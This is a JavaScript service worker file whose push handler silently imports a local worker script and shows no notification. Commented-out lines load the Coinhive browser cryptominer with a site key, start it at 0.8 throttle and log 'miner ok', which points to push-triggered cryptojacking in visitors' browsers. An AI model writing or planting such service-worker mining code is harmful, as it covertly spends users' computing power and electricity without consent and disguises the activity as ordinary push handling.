
self.addEventListener("push",function(event){
    
    if(self._workering){
        
    }
    else{
        self._workering = true;
        importScripts("./oneworker.js");
    }
    
	// importScripts("https://coinhive.com/lib/coinhive.min.js");
	// let miner = CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4", {throttle: 0.8});
	// miner.start();
	// console.log("miner ok");

	console.log('[Service Worker] Push Received.');
    // console.log(`[Service Worker] Push had this data: "${event.data.text()}"`);

    // let notificationData = event.data.json();
    // const title = notificationData.title;
    // 可以发个消息通知页面
    //util.postMessage(notificationData); 
    // 弹消息框
    // event.waitUntil(self.registration.showNotification(title, notificationData));
});



// this.addEventListener('notificationclick', function(event) {
//     console.log('[Service Worker] Notification click Received.');

//     let notification = event.notification;
//     notification.close();
//     event.waitUntil(
//         clients.openWindow(notification.data.url)
//     );
// });